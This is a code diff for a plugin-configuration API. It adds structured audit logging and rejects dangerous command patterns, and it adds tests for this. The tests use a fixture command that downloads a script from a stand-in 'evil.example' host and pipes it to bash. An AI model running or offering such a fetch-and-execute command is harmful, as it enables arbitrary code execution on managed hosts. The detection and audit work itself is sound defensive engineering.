@@ -7,7 +7,9 @@ use crate::extract::Validated;
 use crate::middleware::permission::{
     CanManageCommands, CanTestPluginConfigs, CanTriggerChecks, CanViewSoftware,
 };
-use crate::middleware::require_auth::AuthenticatedUser;
+use crate::middleware::require_auth::{
+    AuthenticatedApiTokenId, AuthenticatedUser, authenticated_user_audit_actor,
+};
 use crate::queries::plugin_configs as pc_queries;
 use crate::tenant_db::TenantDb;
 use axum::{
@@ -150,6 +152,71 @@ async fn load_active_agent_service_for_host(
     }
 }
 
+fn emit_plugin_config_semantic_audit(
+    state: &AppState,
+    tenant_id: Uuid,
+    actor_user: &AuthenticatedUser,
+    api_token_id: Option<AuthenticatedApiTokenId>,
+    action_type: &'static str,
+    target_type: Option<&'static str>,
+    target_id: Option<String>,
+    target_display: Option<String>,
+    outcome: uptrakit_audit_log::AuditOutcome,
+    details: serde_json::Value,
+) {
+    let (actor_type, actor_id) = authenticated_user_audit_actor(actor_user, api_token_id);
+
+    let target_type = target_type.map(std::string::ToString::to_string);
+    if let Ok(entry) = uptrakit_audit_log::AuditEntry::builder(action_type)
+        .tenant_scope(tenant_id)
+        .actor(actor_type, actor_id)
+        .target_opt(target_type, target_id, target_display)
+        .outcome(outcome)
+        .details(details)
+        .build()
+    {
+        state.audit_emitter.emit_best_effort(entry);
+    }
+}
+
+fn dangerous_pattern_matches_to_json(matches: &[DangerousPatternMatch]) -> serde_json::Value {
+    serde_json::Value::Array(
+        matches
+            .iter()
+            .map(|dangerous| {
+                serde_json::json!({
+                    "field": dangerous.field.clone(),
+                    "description": dangerous.description,
+                })
+            })
+            .collect(),
+    )
+}
+
+#[derive(Default)]
+struct CommandRiskSummary {
+    command_fields: Vec<&'static str>,
+    dangerous_matches: Vec<DangerousPatternMatch>,
+}
+
+impl CommandRiskSummary {
+    fn from_config(config: &serde_json::Value) -> Self {
+        Self {
+            command_fields: detect_command_fields(config),
+            dangerous_matches: collect_dangerous_patterns(config),
+        }
+    }
+
+    fn details_fragment(&self) -> serde_json::Value {
+        serde_json::json!({
+            "contains_command_fields": !self.command_fields.is_empty(),
+            "command_fields": self.command_fields,
+            "dangerous_command_match_count": self.dangerous_matches.len(),
+            "dangerous_matches": dangerous_pattern_matches_to_json(&self.dangerous_matches),
+        })
+    }
+}
+
 /// List all known plugin types with their display names and capabilities.
 ///
 /// Returns static registry metadata — no tenant data is involved. Clients
@@ -253,13 +320,15 @@ pub async fn create_plugin_config(
     State(state): State<Arc<AppState>>,
     tenant_db: TenantDb,
     CanManageCommands(user): CanManageCommands,
+    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
     Validated(req): Validated<CreatePluginConfigRequest>,
 ) -> Result<impl IntoResponse, ApiError> {
+    let api_token_id = api_token_id.map(|value| value.0);
+
     let plugin_type_str = req.plugin_type.to_string();
     let config_name = req.name.clone();
-    let command_fields = detect_command_fields(&req.config);
-    // Clone for audit logging (req is consumed by create_plugin_config).
-    let config_for_audit = req.config.clone();
+    let enabled = req.enabled;
+    let config_risk = CommandRiskSummary::from_config(&req.config);
 
     // Validate plugin-specific config (matches the update path).
     let plugin_type_id = PluginTypeId::new(&plugin_type_str);
@@ -275,48 +344,53 @@ pub async fn create_plugin_config(
 
     // Reject dangerous command patterns when operator policy is enabled.
     if state.reject_dangerous_commands {
-        let dangerous = collect_dangerous_patterns(&req.config);
-        if !dangerous.is_empty() {
-            tracing::warn!(
-                target: "security_audit",
-                user_id = %user.user_id,
-                tenant_id = %tenant_db.tenant_id,
-                plugin_type = %plugin_type_str,
-                config_name = %config_name,
-                "plugin config creation rejected — dangerous command patterns detected"
+        if !config_risk.dangerous_matches.is_empty() {
+            emit_plugin_config_semantic_audit(
+                &state,
+                tenant_db.tenant_id,
+                &user,
+                api_token_id,
+                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
+                Some("plugin_config"),
+                None,
+                Some(config_name.clone()),
+                uptrakit_audit_log::AuditOutcome::Denied,
+                serde_json::json!({
+                    "plugin_type": plugin_type_str.clone(),
+                    "config_name": config_name.clone(),
+                    "contains_command_fields": !config_risk.command_fields.is_empty(),
+                    "reason_code": "dangerous_command_patterns_detected",
+                    "dangerous_matches": dangerous_pattern_matches_to_json(&config_risk.dangerous_matches),
+                }),
             );
             return Ok(error_response(
                 StatusCode::BAD_REQUEST,
-                format_dangerous_pattern_rejection(&dangerous),
+                format_dangerous_pattern_rejection(&config_risk.dangerous_matches),
             ));
         }
     }
 
     let resp = pc_queries::create_plugin_config(state.plugin_ops.as_ref(), &tenant_db, req).await?;
-
-    if command_fields.is_empty() {
-        tracing::warn!(
-            target: "security_audit",
-            user_id = %user.user_id,
-            tenant_id = %tenant_db.tenant_id,
-            plugin_config_id = %resp.id,
-            plugin_type = %plugin_type_str,
-            config_name = %config_name,
-            "plugin config created"
-        );
-    } else {
-        tracing::warn!(
-            target: "security_audit",
-            user_id = %user.user_id,
-            tenant_id = %tenant_db.tenant_id,
-            plugin_config_id = %resp.id,
-            plugin_type = %plugin_type_str,
-            config_name = %config_name,
-            command_fields = %command_fields.join(", "),
-            "plugin config created with command-bearing fields"
-        );
-        audit_dangerous_patterns(&config_for_audit, AUDIT_COMMAND_FIELDS);
-    }
+    emit_plugin_config_semantic_audit(
+        &state,
+        tenant_db.tenant_id,
+        &user,
+        api_token_id,
+        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
+        Some("plugin_config"),
+        Some(resp.id.to_string()),
+        Some(resp.name.clone()),
+        uptrakit_audit_log::AuditOutcome::Success,
+        serde_json::json!({
+            "plugin_type": plugin_type_str.clone(),
+            "config_name": resp.name.clone(),
+            "enabled": enabled,
+            "contains_command_fields": !config_risk.command_fields.is_empty(),
+            "command_fields": config_risk.command_fields.clone(),
+            "dangerous_command_match_count": config_risk.dangerous_matches.len(),
+            "dangerous_matches": dangerous_pattern_matches_to_json(&config_risk.dangerous_matches),
+        }),
+    );
 
     Ok((StatusCode::CREATED, Json(resp)).into_response())
 }
@@ -405,8 +479,11 @@ pub async fn update_plugin_config(
     tenant_db: TenantDb,
     Path(config_id): Path<Uuid>,
     CanManageCommands(user): CanManageCommands,
+    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
     Json(req): Json<UpdatePluginConfigRequest>,
 ) -> Result<impl IntoResponse, ApiError> {
+    let api_token_id = api_token_id.map(|value| value.0);
+
     let existing = match PluginConfig::find_by_id(config_id)
         .filter(plugin_config::Column::TenantId.eq(tenant_db.tenant_id))
         .filter(plugin_config::Column::DeactivatedAt.is_null())
@@ -433,31 +510,34 @@ pub async fn update_plugin_config(
         return Ok(rejection);
     }
 
-    // Capture command fields from the incoming request config for audit logging.
-    let new_command_fields = req
-        .config
-        .as_ref()
-        .map(|c| detect_command_fields(c))
-        .unwrap_or_default();
-    // Clone for audit logging (req is consumed by update_plugin_config).
-    let config_for_audit = req.config.clone();
+    let new_config_risk = req.config.as_ref().map(CommandRiskSummary::from_config);
 
     // Reject dangerous command patterns when operator policy is enabled.
     if state.reject_dangerous_commands
-        && let Some(ref config) = req.config
+        && let Some(ref risk) = new_config_risk
     {
-        let dangerous = collect_dangerous_patterns(config);
-        if !dangerous.is_empty() {
-            tracing::warn!(
-                target: "security_audit",
-                user_id = %user.user_id,
-                tenant_id = %tenant_db.tenant_id,
-                plugin_config_id = %config_id,
-                "plugin config update rejected — dangerous command patterns detected"
+        if !risk.dangerous_matches.is_empty() {
+            emit_plugin_config_semantic_audit(
+                &state,
+                tenant_db.tenant_id,
+                &user,
+                api_token_id,
+                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_UPDATE,
+                Some("plugin_config"),
+                Some(config_id.to_string()),
+                req.name.clone(),
+                uptrakit_audit_log::AuditOutcome::Denied,
+                serde_json::json!({
+                    "plugin_type": existing_plugin_type.to_string(),
+                    "config_name": req.name.clone(),
+                    "contains_command_fields": !risk.command_fields.is_empty(),
+                    "reason_code": "dangerous_command_patterns_detected",
+                    "dangerous_matches": dangerous_pattern_matches_to_json(&risk.dangerous_matches),
+                }),
             );
             return Ok(error_response(
                 StatusCode::BAD_REQUEST,
-                format_dangerous_pattern_rejection(&dangerous),
+                format_dangerous_pattern_rejection(&risk.dangerous_matches),
             ));
         }
     }
@@ -465,32 +545,32 @@ pub async fn update_plugin_config(
     let resp =
         pc_queries::update_plugin_config(state.plugin_ops.as_ref(), &tenant_db, config_id, req)
             .await?;
-
-    if new_command_fields.is_empty() {
-        tracing::warn!(
-            target: "security_audit",
-            user_id = %user.user_id,
-            tenant_id = %tenant_db.tenant_id,
-            plugin_config_id = %config_id,
-            plugin_type = %resp.plugin_type,
-            config_name = %resp.name,
-            "plugin config updated"
-        );
-    } else {
-        tracing::warn!(
-            target: "security_audit",
-            user_id = %user.user_id,
-            tenant_id = %tenant_db.tenant_id,
-            plugin_config_id = %config_id,
-            plugin_type = %resp.plugin_type,
-            config_name = %resp.name,
-            command_fields = %new_command_fields.join(", "),
-            "plugin config updated with command-bearing fields"
-        );
-        if let Some(ref config) = config_for_audit {
-            audit_dangerous_patterns(config, AUDIT_COMMAND_FIELDS);
-        }
-    }
+    emit_plugin_config_semantic_audit(
+        &state,
+        tenant_db.tenant_id,
+        &user,
+        api_token_id,
+        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_UPDATE,
+        Some("plugin_config"),
+        Some(config_id.to_string()),
+        Some(resp.name.clone()),
+        uptrakit_audit_log::AuditOutcome::Success,
+        {
+            let risk_details = new_config_risk
+                .as_ref()
+                .map(CommandRiskSummary::details_fragment)
+                .unwrap_or_else(|| CommandRiskSummary::default().details_fragment());
+            serde_json::json!({
+            "plugin_type": resp.plugin_type.to_string(),
+            "config_name": resp.name.clone(),
+            "enabled": resp.enabled,
+            "contains_command_fields": risk_details["contains_command_fields"].clone(),
+            "command_fields": risk_details["command_fields"].clone(),
+            "dangerous_command_match_count": risk_details["dangerous_command_match_count"].clone(),
+            "dangerous_matches": risk_details["dangerous_matches"].clone(),
+            })
+        },
+    );
 
     Ok((StatusCode::OK, Json(resp)).into_response())
 }
@@ -510,24 +590,115 @@ pub async fn update_plugin_config(
 )]
 #[tracing::instrument(skip_all)]
 pub async fn delete_plugin_config(
+    State(state): State<Arc<AppState>>,
     tenant_db: TenantDb,
     Path(config_id): Path<Uuid>,
     CanManageCommands(user): CanManageCommands,
+    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
 ) -> Response {
+    let api_token_id = api_token_id.map(|value| value.0);
+
+    let existing = match PluginConfig::find_by_id(config_id)
+        .filter(plugin_config::Column::TenantId.eq(tenant_db.tenant_id))
+        .filter(plugin_config::Column::DeactivatedAt.is_null())
+        .one(tenant_db.db())
+        .await
+    {
+        Ok(model) => model,
+        Err(e) => {
+            tracing::error!("DB error loading plugin config for delete: {e}");
+            emit_plugin_config_semantic_audit(
+                &state,
+                tenant_db.tenant_id,
+                &user,
+                api_token_id,
+                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+                Some("plugin_config"),
+                Some(config_id.to_string()),
+                None,
+                uptrakit_audit_log::AuditOutcome::Failed,
+                serde_json::json!({
+                    "reason_code": "plugin_config_load_failed",
+                }),
+            );
+            return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
+        }
+    };
+
     match pc_queries::delete_plugin_config(&tenant_db, config_id).await {
         Ok(true) => {
-            tracing::warn!(
-                target: "security_audit",
-                user_id = %user.user_id,
-                tenant_id = %tenant_db.tenant_id,
-                plugin_config_id = %config_id,
-                "plugin config deleted"
+            let (target_display, details) = if let Some(existing) = existing {
+                let config_risk = CommandRiskSummary::from_config(&existing.config);
+                (
+                    Some(existing.name.clone()),
+                    serde_json::json!({
+                        "plugin_type": existing.plugin_type,
+                        "config_name": existing.name,
+                        "enabled": existing.enabled,
+                        "contains_command_fields": !config_risk.command_fields.is_empty(),
+                        "command_fields": config_risk.command_fields,
+                        "dangerous_command_match_count": config_risk.dangerous_matches.len(),
+                        "dangerous_matches": dangerous_pattern_matches_to_json(&config_risk.dangerous_matches),
+                    }),
+                )
+            } else {
+                (
+                    None,
+                    serde_json::json!({
+                        "contains_command_fields": false,
+                        "command_fields": [],
+                        "dangerous_command_match_count": 0,
+                        "dangerous_matches": [],
+                    }),
+                )
+            };
+            emit_plugin_config_semantic_audit(
+                &state,
+                tenant_db.tenant_id,
+                &user,
+                api_token_id,
+                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+                Some("plugin_config"),
+                Some(config_id.to_string()),
+                target_display,
+                uptrakit_audit_log::AuditOutcome::Success,
+                details,
             );
             StatusCode::NO_CONTENT.into_response()
         }
-        Ok(false) => error_response(StatusCode::NOT_FOUND, "Plugin config not found"),
+        Ok(false) => {
+            emit_plugin_config_semantic_audit(
+                &state,
+                tenant_db.tenant_id,
+                &user,
+                api_token_id,
+                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+                Some("plugin_config"),
+                Some(config_id.to_string()),
+                None,
+                uptrakit_audit_log::AuditOutcome::Denied,
+                serde_json::json!({
+                    "reason_code": "plugin_config_not_found",
+                }),
+            );
+            error_response(StatusCode::NOT_FOUND, "Plugin config not found")
+        }
         Err(e) => {
             tracing::error!("Failed to delete plugin config: {e}");
+            emit_plugin_config_semantic_audit(
+                &state,
+                tenant_db.tenant_id,
+                &user,
+                api_token_id,
+                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+                Some("plugin_config"),
+                Some(config_id.to_string()),
+                existing.as_ref().map(|model| model.name.clone()),
+                uptrakit_audit_log::AuditOutcome::Failed,
+                serde_json::json!({
+                    "reason_code": "plugin_config_delete_failed",
+                }),
+            );
             error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error")
         }
     }
@@ -670,6 +841,7 @@ pub async fn discover_plugin_config(
 // ── Security audit helpers ────────────────────────────────────────────────────
 
 /// Detected dangerous pattern in a command-bearing field.
+#[derive(Debug)]
 struct DangerousPatternMatch {
     /// Display-friendly field name (e.g. `"version_command"`, `"hooks.pre_update.commands[0]"`).
     field: String,
@@ -689,7 +861,11 @@ fn collect_dangerous_patterns(config: &serde_json::Value) -> Vec<DangerousPatter
     let mut results = Vec::new();
 
     // Check top-level command string fields.
-    for &(field_name, display_name, _) in AUDIT_COMMAND_FIELDS {
+    for &(field_name, display_name) in &[
+        ("version_command", "version_command"),
+        ("update_command", "update_command"),
+        ("post_pull_command", "post_pull_command"),
+    ] {
         if let Some(val) = obj.get(field_name).and_then(|v| v.as_str()) {
             let patterns =
                 uptrakit_web_api_types::command_validation::detect_dangerous_patterns(val);
@@ -740,68 +916,6 @@ fn format_dangerous_pattern_rejection(matches: &[DangerousPatternMatch]) -> Stri
     }
     msg
 }
-
-/// Emit `security_audit` target warnings for any dangerous patterns found in
-/// command-bearing fields of a plugin configuration.
-///
-/// This is advisory only — the `manage_commands` permission is already
-/// documented as equivalent to RCE on managed hosts.
-fn audit_dangerous_patterns(config: &serde_json::Value, context_fields: &[(&str, &str, &str)]) {
-    let obj = match config.as_object() {
-        Some(o) => o,
-        None => return,
-    };
-
-    // Check top-level command string fields.
-    for &(field_name, display_name, _) in context_fields {
-        if let Some(val) = obj.get(field_name).and_then(|v| v.as_str()) {
-            let patterns =
-                uptrakit_web_api_types::command_validation::detect_dangerous_patterns(val);
-            for (pattern, desc) in patterns {
-                tracing::warn!(
-                    target: "security_audit",
-                    field = display_name,
-                    pattern = pattern,
-                    "dangerous command pattern detected — {desc}"
-                );
-            }
-        }
-    }
-
-    // Check structured hook commands.
-    if let Some(hooks) = obj.get("hooks").and_then(|v| v.as_object()) {
-        for phase in ["pre_update", "post_update"] {
-            if let Some(hook) = hooks.get(phase).and_then(|v| v.as_object())
-                && let Some(arr) = hook.get("commands").and_then(|v| v.as_array())
-            {
-                for (i, cmd) in arr.iter().enumerate() {
-                    if let Some(cmd_str) = cmd.as_str() {
-                        let patterns =
-                            uptrakit_web_api_types::command_validation::detect_dangerous_patterns(
-                                cmd_str,
-                            );
-                        for (pattern, desc) in patterns {
-                            tracing::warn!(
-                                target: "security_audit",
-                                field = %format!("hooks.{phase}.commands[{i}]"),
-                                pattern = pattern,
-                                "dangerous command pattern detected — {desc}"
-                            );
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
-
-/// Fields in plugin configs that contain single command strings, with their
-/// display name and a marker for the audit helper.
-const AUDIT_COMMAND_FIELDS: &[(&str, &str, &str)] = &[
-    ("version_command", "version_command", "single"),
-    ("update_command", "update_command", "single"),
-    ("post_pull_command", "post_pull_command", "single"),
-];
 
 /// Known field names that carry executable commands in plugin configs.
 const COMMAND_FIELD_NAMES: &[&str] = &[
@@ -874,25 +988,85 @@ fn detect_command_fields(config: &serde_json::Value) -> Vec<&'static str> {
 )]
 #[tracing::instrument(skip_all)]
 pub async fn batch_plugin_configs(
+    State(state): State<Arc<AppState>>,
     tenant_db: TenantDb,
-    CanManageCommands(_user): CanManageCommands,
+    CanManageCommands(user): CanManageCommands,
+    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
     Validated(body): Validated<BatchActionRequest>,
 ) -> Response {
+    let api_token_id = api_token_id.map(|value| value.0);
+
     let (succeeded_ids, failed) = match body.action.as_str() {
         "delete" => match pc_queries::batch_delete_plugin_configs(&tenant_db, &body.ids).await {
             Ok(r) => r,
             Err(e) => {
                 tracing::error!("batch delete failed: {e}");
+                emit_plugin_config_semantic_audit(
+                    &state,
+                    tenant_db.tenant_id,
+                    &user,
+                    api_token_id,
+                    uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+                    None,
+                    None,
+                    None,
+                    uptrakit_audit_log::AuditOutcome::Failed,
+                    serde_json::json!({
+                        "update_kind": "batch_delete",
+                        "reason_code": "batch_delete_failed",
+                        "requested_count": body.ids.len(),
+                    }),
+                );
                 return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
             }
         },
         unknown => {
+            emit_plugin_config_semantic_audit(
+                &state,
+                tenant_db.tenant_id,
+                &user,
+                api_token_id,
+                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+                None,
+                None,
+                None,
+                uptrakit_audit_log::AuditOutcome::ValidationFailed,
+                serde_json::json!({
+                    "update_kind": "batch_delete",
+                    "reason_code": "unknown_action",
+                    "action": unknown,
+                }),
+            );
             return error_response(
                 StatusCode::BAD_REQUEST,
                 format!("unknown action: {unknown}. Supported: delete"),
             );
         }
     };
+
+    emit_plugin_config_semantic_audit(
+        &state,
+        tenant_db.tenant_id,
+        &user,
+        api_token_id,
+        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        None,
+        None,
+        None,
+        if failed.is_empty() {
+            uptrakit_audit_log::AuditOutcome::Success
+        } else if succeeded_ids.is_empty() {
+            uptrakit_audit_log::AuditOutcome::Denied
+        } else {
+            uptrakit_audit_log::AuditOutcome::Partial
+        },
+        serde_json::json!({
+            "update_kind": "batch_delete",
+            "requested_count": body.ids.len(),
+            "deleted_count": succeeded_ids.len(),
+            "failed_count": failed.len(),
+        }),
+    );
 
     let response = BatchActionResponse {
         succeeded: succeeded_ids
@@ -1099,10 +1273,51 @@ pub async fn test_plugin_config(
 
 #[cfg(test)]
 mod tests {
+    #[cfg(feature = "db-sqlite")]
+    use super::batch_plugin_configs;
+    #[cfg(feature = "db-sqlite")]
+    use super::create_plugin_config;
+    #[cfg(feature = "db-sqlite")]
+    use super::delete_plugin_config;
     use super::plugin_field_to_api_field;
+    #[cfg(feature = "db-sqlite")]
+    use super::update_plugin_config;
+    #[cfg(feature = "db-sqlite")]
+    use crate::AppState;
+    #[cfg(feature = "db-sqlite")]
+    use crate::auth::AuthMethod;
+    #[cfg(feature = "db-sqlite")]
+    use crate::auth::permissions::Permission;
+    #[cfg(feature = "db-sqlite")]
+    use crate::extract::Validated;
+    #[cfg(feature = "db-sqlite")]
+    use crate::middleware::permission::CanManageCommands;
+    #[cfg(feature = "db-sqlite")]
+    use crate::middleware::require_auth::{AuthenticatedApiTokenId, AuthenticatedUser};
+    #[cfg(feature = "db-sqlite")]
+    use crate::tenant_db::TenantDb;
+    #[cfg(feature = "db-sqlite")]
+    use axum::{
+        Extension, Json,
+        extract::{Path, State},
+        http::StatusCode,
+        response::IntoResponse,
+    };
+    #[cfg(feature = "db-sqlite")]
+    use sea_orm::{ColumnTrait, ConnectionTrait, EntityTrait, QueryFilter, QueryOrder};
     use serde_json::json;
+    #[cfg(feature = "db-sqlite")]
+    use std::sync::Arc;
     use uptrakit_plugin_infrastructure_registry::{CatalogConfig, PluginConfigOps, build_catalog};
+    #[cfg(feature = "db-sqlite")]
+    use uptrakit_shared_db::entity::{audit_log, plugin_config, prelude::PluginConfig};
     use uptrakit_shared_types::PluginTypeId;
+    #[cfg(feature = "db-sqlite")]
+    use uptrakit_web_api_types::batch_actions::BatchActionRequest;
+    #[cfg(feature = "db-sqlite")]
+    use uptrakit_web_api_types::plugin_configs::{
+        CreatePluginConfigRequest, UpdatePluginConfigRequest,
+    };
     use uptrakit_web_api_types::plugin_configs::{
         FieldType as ApiFieldType, SelectSource as ApiSelectSource,
     };
@@ -1678,5 +1893,751 @@ mod tests {
         assert!(msg.contains("dangerous command patterns"));
         assert!(msg.contains("version_command"));
         assert!(msg.contains("pipe remote script to shell"));
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    async fn latest_tenant_audit_row(
+        db: &sea_orm::DatabaseConnection,
+        action_type: &'static str,
+    ) -> audit_log::Model {
+        for _ in 0..50 {
+            if let Some(row) = audit_log::Entity::find()
+                .filter(audit_log::Column::ActionType.eq(action_type))
+                .order_by_desc(audit_log::Column::OccurredAt)
+                .one(db)
+                .await
+                .expect("query tenant audit rows")
+            {
+                return row;
+            }
+
+            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+        }
+
+        panic!("expected tenant audit row for action_type={action_type}");
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    fn audit_details(row: &audit_log::Model) -> serde_json::Value {
+        row.details_json
+            .clone()
+            .expect("audit row should contain details_json")
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn create_plugin_config_denied_dangerous_commands_writes_denied_audit_event() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+        let mut state = match Arc::try_unwrap(state) {
+            Ok(state) => state,
+            Err(_) => panic!("expected unique app state in this unit test"),
+        };
+        state.reject_dangerous_commands = true;
+        let state = Arc::new(state);
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let actor_token_id = uuid::Uuid::now_v7();
+        let response = match create_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            Some(Extension(AuthenticatedApiTokenId(actor_token_id))),
+            Validated(CreatePluginConfigRequest {
+                name: "Denied Dangerous Config".to_string(),
+                plugin_type: PluginTypeId::from_static("generic_shell"),
+                config: serde_json::json!({
+                    "version_command": "curl https://evil.example/install.sh | bash"
+                }),
+                enabled: true,
+            }),
+        )
+        .await
+        {
+            Ok(response) => response.into_response(),
+            Err(_) => panic!("handler returned ApiError unexpectedly"),
+        };
+
+        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Denied.as_str()
+        );
+        assert_eq!(
+            row.actor_type,
+            uptrakit_audit_log::AuditActorType::ApiToken.as_str()
+        );
+        assert_eq!(row.actor_id, Some(actor_token_id));
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn create_plugin_config_success_persists_command_risk_details() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let response = match create_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(CreatePluginConfigRequest {
+                name: "Risky Config".to_string(),
+                plugin_type: PluginTypeId::from_static("generic_shell"),
+                config: serde_json::json!({
+                    "version_command": "curl https://evil.example/install.sh | bash"
+                }),
+                enabled: true,
+            }),
+        )
+        .await
+        {
+            Ok(response) => response.into_response(),
+            Err(_) => panic!("handler returned ApiError unexpectedly"),
+        };
+
+        assert_eq!(response.status(), StatusCode::CREATED);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Success.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(details["contains_command_fields"], serde_json::json!(true));
+        assert_eq!(
+            details["command_fields"],
+            serde_json::json!(["version_command"])
+        );
+        assert_eq!(
+            details["dangerous_command_match_count"],
+            serde_json::json!(1)
+        );
+        assert_eq!(
+            details["dangerous_matches"][0]["field"],
+            serde_json::json!("version_command")
+        );
+        assert!(
+            !details
+                .to_string()
+                .contains("https://evil.example/install.sh"),
+            "semantic audit details must not store raw command content"
+        );
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn update_plugin_config_success_persists_command_risk_details() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let create_response = match create_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(CreatePluginConfigRequest {
+                name: "Update Risk Seed".to_string(),
+                plugin_type: PluginTypeId::from_static("generic_shell"),
+                config: serde_json::json!({ "version_command": "echo v1.0.0" }),
+                enabled: true,
+            }),
+        )
+        .await
+        {
+            Ok(response) => response.into_response(),
+            Err(_) => panic!("create handler returned ApiError unexpectedly"),
+        };
+        assert_eq!(create_response.status(), StatusCode::CREATED);
+
+        let created = PluginConfig::find()
+            .filter(plugin_config::Column::TenantId.eq(tenant_id))
+            .filter(plugin_config::Column::Name.eq("Update Risk Seed"))
+            .filter(plugin_config::Column::DeactivatedAt.is_null())
+            .order_by_desc(plugin_config::Column::CreatedAt)
+            .one(&db)
+            .await
+            .expect("query created plugin config")
+            .expect("created plugin config row");
+
+        let update_response = match update_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            Path(created.id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Json(UpdatePluginConfigRequest {
+                name: Some("Update Risk Applied".to_string()),
+                config: Some(serde_json::json!({
+                    "version_command": "curl https://evil.example/install.sh | bash"
+                })),
+                enabled: Some(true),
+            }),
+        )
+        .await
+        {
+            Ok(response) => response.into_response(),
+            Err(_) => panic!("update handler returned ApiError unexpectedly"),
+        };
+        assert_eq!(update_response.status(), StatusCode::OK);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_UPDATE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Success.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(details["contains_command_fields"], serde_json::json!(true));
+        assert_eq!(
+            details["command_fields"],
+            serde_json::json!(["version_command"])
+        );
+        assert_eq!(
+            details["dangerous_command_match_count"],
+            serde_json::json!(1)
+        );
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn delete_plugin_config_success_persists_command_risk_details() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let create_response = match create_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(CreatePluginConfigRequest {
+                name: "Delete Risk Seed".to_string(),
+                plugin_type: PluginTypeId::from_static("generic_shell"),
+                config: serde_json::json!({
+                    "version_command": "curl https://evil.example/install.sh | bash"
+                }),
+                enabled: true,
+            }),
+        )
+        .await
+        {
+            Ok(response) => response.into_response(),
+            Err(_) => panic!("create handler returned ApiError unexpectedly"),
+        };
+        assert_eq!(create_response.status(), StatusCode::CREATED);
+
+        let created = PluginConfig::find()
+            .filter(plugin_config::Column::TenantId.eq(tenant_id))
+            .filter(plugin_config::Column::Name.eq("Delete Risk Seed"))
+            .filter(plugin_config::Column::DeactivatedAt.is_null())
